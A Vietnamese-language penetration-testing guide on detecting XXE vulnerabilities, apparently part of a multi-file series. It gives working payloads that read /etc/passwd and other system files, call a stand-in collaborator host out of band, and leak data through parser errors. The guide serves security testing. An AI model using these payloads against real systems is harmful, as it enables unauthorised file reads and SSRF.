# Phát Hiện XXE

## Mục Tiêu Phát Hiện

Khi test XXE, cần trả lời được 4 câu hỏi:

1. Endpoint/chức năng nào đang parse XML?
2. Parser có cho phép entity/DTD/XInclude không?
3. Có kênh in-band hay blind/OOB?
4. Mục tiêu khai thác khả thi là gì (file read, SSRF, exfil, error-based)?

## Bước 1: Xác Định Endpoint Có Xử Lý XML

### Input XML Trực Tiếp

- `Content-Type: application/xml`, `text/xml`
- SOAP requests
- XML upload endpoints

### Input XML Ẩn

- Chuyển `application/json` sang XML nếu backend chấp nhận
- Chuyển `application/x-www-form-urlencoded` sang XML
- Upload file có XML bên trong: SVG, DOCX/XLSX, XLIFF, RSS-based import

## Bước 2: Kiểm Tra Nền Parser

### Kiểm Tra Nhanh Internal Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test "XXE_TEST">]>
<root><id>&test;</id></root>
```

Nếu response/processing thay đổi theo `XXE_TEST`, parser đang xử lý entity.

### Probe Đọc File Qua External Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<root><id>&xxe;</id></root>
```

Trên Windows có thể thử `file:///c:/windows/win.ini` hoặc `file:///c:/boot.ini`.

## Bước 3: Kiểm Tra Khả Năng SSRF

```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://COLLABORATOR_DOMAIN">]>
<root><id>&xxe;</id></root>
```

Nếu có DNS/HTTP interaction về server kiểm soát bởi bạn, XXE -> SSRF khả thi.

## Bước 4: Kiểm Tra Blind XXE Qua Parameter Entity

Khi payload thường bị chặn, thử parameter entities:

```xml
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://COLLABORATOR_DOMAIN">
  %xxe;
]>
<root>1</root>
```

Nếu có OOB hit, parser đang resolve parameter entity trong DTD.

## Bước 5: Kiểm Tra Khả Năng Error-Based

Thử kích hoạt parser error có kiểm soát:

```xml
<!DOCTYPE root [
  <!ENTITY % data SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%data;'>">
  %eval;
  %err;
]>
<root/>
```

Nếu ứng dụng trả error chi tiết, có thể dùng error-based leakage.

## Dấu Hiệu Kinh Nghiệm và Tín Hiệu Nhận Diện

| Tín hiệu                                   | Ý nghĩa                  |
| ------------------------------------------ | ------------------------ |
| Nội dung file xuất hiện trong response     | In-band XXE file read    |
| Collaborator có DNS/HTTP hit               | Blind XXE/OOB resolution |
| Parser error chứa fragment dữ liệu         | Error-based XXE          |
| Delay/treo bất thường khi entity expansion | DoS risk qua parser      |

## Các Trường Hợp Âm Tính Giả Thường Gặp

- Chỉ test 1 node XML thay vì test từng node có thể reflected
- Sai `Content-Type` nên backend không parse XML
- Parser chỉ cho parameter entity, chặn general entity
- OOB bị chặn bởi egress policy
- Data có newline làm hỏng URL exfil trên một số parser/runtime

## Checklist Kiểm Thử Thực Tế

1. Xác định tất cả điểm nhận XML (trực tiếp + hidden).
2. Probe internal entity để xác nhận parser behavior.
3. Probe external entity file read.
4. Probe OOB với general entity và parameter entity.
5. Thử error-based payload nếu có verbose errors.
6. Ghi lại endpoint, payload, signal, impact và điều kiện tái hiện.

## Tệp Liên Quan

- [04-exploitation-workflow.md](04-exploitation-workflow.md)
- [07-blind-xxe-and-oob-exfiltration.md](07-blind-xxe-and-oob-exfiltration.md)
- [08-hidden-attack-surface.md](08-hidden-attack-surface.md)
- [10-payloads-cheatsheet.md](10-payloads-cheatsheet.md)
